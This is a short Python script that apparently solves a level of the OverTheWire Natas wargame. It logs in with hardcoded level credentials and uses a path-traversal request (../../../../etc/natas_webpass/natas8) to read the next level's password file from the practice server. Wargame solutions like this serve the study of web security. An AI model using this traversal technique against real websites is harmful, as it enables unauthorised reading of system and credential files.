import requests

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8".format(
    username)
response = session.get(url, auth=(username, password))
content = response.text

print(content)
